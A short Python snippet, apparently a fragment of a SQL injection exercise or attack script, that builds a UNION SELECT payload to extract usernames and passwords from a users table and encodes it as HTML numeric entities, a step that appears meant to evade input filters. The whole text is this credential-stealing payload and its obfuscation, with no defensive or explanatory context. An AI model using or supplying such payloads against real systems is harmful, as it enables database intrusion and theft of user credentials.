payload = "UNION SELECT username||'~'||password FROM users"
encoded = ''.join(f'&#{ord(c)};' for c in payload)
print(encoded)
